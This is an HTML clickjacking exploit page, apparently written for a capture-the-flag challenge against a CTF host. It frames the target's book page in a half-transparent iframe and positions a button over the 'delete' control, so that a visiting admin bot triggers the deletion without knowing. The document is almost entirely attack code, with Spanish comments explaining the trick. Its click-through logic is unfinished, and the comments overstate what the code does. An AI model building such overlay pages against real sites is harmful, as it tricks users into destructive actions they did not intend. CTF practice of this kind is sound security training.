<!DOCTYPE html>
<html>
<head>
    <title>Clickjacking Final</title>
    <style>
        body { margin: 0; padding: 0; background: white; }
        
        #wrapper {
            position: relative;
            width: 1000px;
            height: 1000px;
            margin: 0 auto;
        }

        iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: none;
            z-index: 1; /* El iframe está ABAJO */
            opacity: 0.5; /* Mantenlo así para ver si el botón del admin aparece */
        }

        #objetivo {
            position: absolute;
            top: 795px; /* Coordenada del botón de borrar */
            left: 15px;
            width: 300px;
            height: 80px;
            z-index: 2; /* El botón del bot está ENCIMA */
            
            /* TRUCO MAESTRO: */
            /* Hacemos que el botón sea invisible pero capture el clic 
               y lo deje pasar al iframe inmediatamente después */
            background: rgba(255,0,0,0.1); 
            border: none;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div id="wrapper">
        <button id="objetivo" onclick="explotar()"></button>
        
        <iframe id="victima" src="https://ctf.fap.hispasec.com:8018/books/1"></iframe>
    </div>

    <script>
        function explotar() {
            // Cuando el bot hace clic, podemos intentar forzar un segundo clic 
            // o simplemente dejar que el evento traspase.
            console.log("El bot ha pulsado el objetivo");
        }
    </script>
</body>
</html>
